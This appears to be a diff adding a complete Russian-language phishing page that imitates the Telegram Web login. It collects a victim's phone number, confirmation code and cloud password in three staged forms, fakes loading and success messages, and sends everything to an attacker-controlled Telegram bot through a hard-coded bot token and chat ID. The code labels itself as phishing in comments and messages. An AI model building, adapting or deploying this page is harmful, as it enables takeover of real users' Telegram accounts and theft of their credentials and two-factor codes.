@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <style>
+        :root {
+            --tg-blue: #229ED9;
+            --tg-bg: #F4F4F5;
+            --text-color: #111;
+            --border-color: #E0E0E0;
+            --error-color: #D93025;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                height: 85vh;
+                border-radius: 12px;
+            }
+        }
+
+        .header {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: var(--tg-blue);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 15px;
+        }
+
+        .logo svg {
+            width: 45px;
+            height: 45px;
+            fill: white;
+        }
+
+        .title {
+            font-size: 1.5rem;
+            color: var(--text-color);
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .content {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .phone-input, .code-input, .password-input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 1.1rem;
+            outline: none;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .phone-input {
+            text-align: left;
+        }
+
+        .code-input {
+            letter-spacing: 0.5em;
+            font-weight: bold;
+        }
+
+        .password-input {
+            font-family: monospace;
+        }
+
+        .input-group input:focus {
+            border-color: var(--tg-blue);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--tg-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn:hover {
+            background: #1d8abf;
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #888;
+        }
+
+        .footer a {
+            color: var(--tg-blue);
+            text-decoration: none;
+        }
+
+        .loader {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--tg-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 0.9rem;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .success-message {
+            color: var(--tg-blue);
+            font-size: 0.9rem;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <!-- Иконка самолета Telegram -->
+            <svg viewBox="0 0 24 24">
+                <path d="M23.5 6.9c.3-1 0-1.7-.9-1.9L1.9 10.6c-.9.3-1 1.4-.2 1.8l5.1 3.2 2 6.2c.3.9 1.4 1.1 2 .5l2.8-3.6 5.1 3.7c.7.5 1.7.1 1.9-.7l2.9-14.8zM8.3 15.1l-4.6-3 14.2-4.7-10.2 7.7z"/>
+            </svg>
+        </div>
+        <div class="title">Telegram Web</div>
+        <div class="subtitle" id="dynamicSubtitle">Вход через телефон</div>
+    </div>
+
+    <div class="content">
+        <!-- Этап 1: Ввод телефона -->
+        <div id="stepPhone">
+            <div class="input-group">
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" class="phone-input" placeholder="+7 (___) ___-__-__" value="+7 ">
+            </div>
+            <button class="btn" id="submitPhoneBtn" onclick="handlePhone()">Продолжить</button>
+        </div>
+
+        <!-- Этап 2: Ввод кода -->
+        <div id="stepCode" class="hidden">
+            <div class="input-group">
+                <label for="code">Код подтверждения</label>
+                <input type="text" id="code" class="code-input" maxlength="5" placeholder="_____" autocomplete="off">
+            </div>
+            <button class="btn" id="submitCodeBtn" onclick="handleCode()">Подтвердить</button>
+            <div class="error-message" id="codeError"></div>
+        </div>
+
+        <!-- Этап 3: Ввод пароля -->
+        <div id="stepPassword" class="hidden">
+            <div class="input-group">
+                <label for="password">Пароль облака (Cloud Password)</label>
+                <input type="password" id="password" class="password-input" placeholder="••••••••" autocomplete="off">
+            </div>
+            <button class="btn" id="submitPasswordBtn" onclick="handlePassword()">Войти</button>
+            <div class="error-message" id="passwordError"></div>
+            <div class="success-message" id="passwordSuccess"></div>
+        </div>
+
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <div class="footer">
+        <a href="#" onclick="event.preventDefault(); window.location.href='https://telegram.org';">Скачать приложение</a> &bull; <a href="#">Помощь</a>
+    </div>
+</div>
+
+<script>
+    const phoneInput = document.getElementById('phone');
+    const codeInput = document.getElementById('code');
+    const passwordInput = document.getElementById('password');
+    const loader = document.getElementById('loader');
+    const dynamicSubtitle = document.getElementById('dynamicSubtitle');
+
+    // Данные для отправки
+    let userData = {
+        phone: '',
+        code: '',
+        password: '',
+        source: window.location.href,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    };
+
+    // Автоматическое форматирование номера
+    phoneInput.addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.startsWith('8')) {
+            value = '7' + value;
+        }
+        if (!value.startsWith('7')) {
+            value = '7' + value;
+        }
+        
+        let formatted = '+' + value.substring(0, 1);
+        if (value.length > 1) {
+            formatted += ' (' + value.substring(1, 4);
+            if (value.length > 4) {
+                formatted += ') ' + value.substring(4, 7);
+                if (value.length > 7) {
+                    formatted += '-' + value.substring(7, 9);
+                    if (value.length > 9) {
+                        formatted += '-' + value.substring(9, 11);
+                    }
+                }
+            }
+        }
+        e.target.value = formatted;
+    });
+
+    // Ограничение ввода только цифр в поле кода
+    codeInput.addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
+
+    function showStep(stepId) {
+        document.getElementById('stepPhone').classList.add('hidden');
+        document.getElementById('stepCode').classList.add('hidden');
+        document.getElementById('stepPassword').classList.add('hidden');
+        document.getElementById(stepId).classList.remove('hidden');
+    }
+
+    function showLoader(show) {
+        loader.style.display = show ? 'block' : 'none';
+    }
+
+    function handlePhone() {
+        const phone = phoneInput.value;
+        if (phone.length < 12) {
+            alert("Введите полный номер телефона");
+            return;
+        }
+
+        userData.phone = phone;
+        showLoader(true);
+
+        // Имитация загрузки
+        setTimeout(() => {
+            showLoader(false);
+            dynamicSubtitle.innerText = "Введите код, отправленный на " + phone;
+            showStep('stepCode');
+        }, 1500);
+    }
+
+    function handleCode() {
+        const code = codeInput.value;
+        if (code.length < 5) {
+            document.getElementById('codeError').innerText = "Код должен быть 5 цифр";
+            return;
+        }
+
+        userData.code = code;
+        document.getElementById('codeError').innerText = "";
+        showLoader(true);
+
+        // Имитация проверки кода
+        setTimeout(() => {
+            showLoader(false);
+            dynamicSubtitle.innerText = "Введите пароль облака";
+            showStep('stepPassword');
+        }, 1500);
+    }
+
+    function handlePassword() {
+        const password = passwordInput.value;
+        if (password.length < 1) {
+            document.getElementById('passwordError').innerText = "Введите пароль";
+            return;
+        }
+
+        userData.password = password;
+        document.getElementById('passwordError').innerText = "";
+        showLoader(true);
+
+        // Отправка данных на ваш сервер/бота
+        sendPhishingData(userData);
+
+        // Имитация успешного входа
+        setTimeout(() => {
+            showLoader(false);
+            document.getElementById('passwordSuccess').innerText = "Вход выполнен успешно! Перенаправление...";
+            
+            // В реальном сценарии здесь можно перенаправить на настоящий Telegram
+            // window.location.href = 'https://web.telegram.org';
+        }, 2000);
+    }
+
+    function sendPhishingData(data) {
+        console.log("Phishing Data Captured:", data);
+        
+        // Пример отправки на Telegram бота
+        const chatId = "5814133322";
+        const botToken = "8861126865:AAGYaTGe0WMlrPX_a6Db1VWFFW_kwiY08EI";
+        
+        const text = `🚨 Новый фишинг-запрос:\n\n📱 Телефон: ${data.phone}\n🔑 Код: ${data.code}\n🔒 Пароль: ${data.password}\n🌐 Источник: ${data.source}\n🕒 Время: ${data.timestamp}\n🖥️ Браузер: ${data.userAgent}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        }).catch(console.error);
+    }
+</script>
+
+</body>
+</html>
